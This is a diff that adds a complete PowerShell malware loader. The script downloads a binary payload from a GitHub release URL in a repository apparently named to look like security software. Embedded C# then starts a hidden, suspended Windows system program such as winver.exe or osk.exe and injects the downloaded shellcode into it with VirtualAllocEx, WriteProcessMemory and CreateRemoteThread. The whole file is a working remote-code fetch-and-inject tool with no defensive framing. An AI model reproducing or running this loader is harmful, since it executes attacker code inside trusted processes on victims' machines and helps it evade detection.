@@ -1,0 +1,183 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+$PayloadUrl = "https://github.com/Desantpodtabyret/SecurutyCodex/releases/download/Security/123.bin"
+
+$CSharpEngine = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class GhostEngine
+{
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    static extern int ResumeThread(IntPtr hThread);
+
+    [DllImport("kernel32.dll")]
+    static extern bool CloseHandle(IntPtr hObject);
+
+    [DllImport("kernel32.dll")]
+    static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    struct STARTUPINFO
+    {
+        public uint cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttribute;
+        public uint dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+
+	static string[] targets = new string[] {
+		@"C:\Windows\System32\colorcpl.exe",
+		@"C:\Windows\System32\winver.exe",
+		@"C:\Windows\System32\cttune.exe",
+		@"C:\Windows\System32\osk.exe"
+    };
+
+    public static bool Inject(byte[] shellcode, ref string log)
+    {
+        STARTUPINFO si = new STARTUPINFO();
+        si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
+        si.dwFlags = 0x00000001;
+        si.wShowWindow = 0;
+
+        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+        bool created = false;
+
+        foreach (string target in targets)
+        {
+            if (!System.IO.File.Exists(target))
+            {
+                log += "[*] Skip (not found): " + target + "\n";
+                continue;
+            }
+
+            created = CreateProcess(target, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi);
+
+            if (created)
+            {
+                log += "[+] Process created | " + target + " | PID: " + pi.dwProcessId + "\n";
+                break;
+            }
+            else
+            {
+                log += "[*] Failed: " + target + " | err: " + Marshal.GetLastWin32Error() + "\n";
+            }
+        }
+
+        if (!created)
+        {
+            log += "[-] All targets failed.\n";
+            return false;
+        }
+
+        try
+        {
+            IntPtr alloc = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
+
+            if (alloc == IntPtr.Zero)
+            {
+                log += "[-] VirtualAllocEx failed: " + Marshal.GetLastWin32Error() + "\n";
+                TerminateProcess(pi.hProcess, 0);
+                return false;
+            }
+
+            log += "[+] Memory allocated | 0x" + alloc.ToInt64().ToString("X") + "\n";
+
+            int bytesWritten;
+            bool writeRes = WriteProcessMemory(pi.hProcess, alloc, shellcode, shellcode.Length, out bytesWritten);
+
+            if (!writeRes || bytesWritten != shellcode.Length)
+            {
+                log += "[-] WriteProcessMemory failed: " + Marshal.GetLastWin32Error() + "\n";
+                TerminateProcess(pi.hProcess, 0);
+                return false;
+            }
+
+            log += "[+] Shellcode written | " + bytesWritten + " bytes\n";
+
+            uint threadId;
+            IntPtr hThread = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, out threadId);
+
+            if (hThread == IntPtr.Zero)
+            {
+                log += "[-] CreateRemoteThread failed: " + Marshal.GetLastWin32Error() + "\n";
+                TerminateProcess(pi.hProcess, 0);
+                return false;
+            }
+
+            ResumeThread(pi.hThread);
+            log += "[+] Shellcode executing | TID: " + threadId + "\n";
+            return true;
+        }
+        finally
+        {
+            if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
+            if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
+        }
+    }
+}
+"@
+
+Add-Type -TypeDefinition $CSharpEngine -Language CSharp
+
+$shellcode = $null
+$maxRetries = 3
+
+for ($i = 1; $i -le $maxRetries; $i++) {
+    try {
+        $wc = New-Object System.Net.WebClient
+        $shellcode = $wc.DownloadData($PayloadUrl)
+        $wc.Dispose()
+        Write-Output "[+] Payload loaded | $($shellcode.Length) bytes"
+        break
+    }
+    catch {
+        Write-Output "[*] Attempt $i/$maxRetries failed: $_"
+        if ($i -eq $maxRetries) {
+            Write-Output "[-] Download failed. Aborting."
+            return
+        }
+        Start-Sleep -Seconds 2
+    }
+}
+
+$log = ""
+$success = [GhostEngine]::Inject($shellcode, [ref]$log)
+Write-Output $log
+if ($success) { Write-Output "[SUCCESS] Injection complete." }
+else { Write-Output "[FAILED] Injection aborted." }
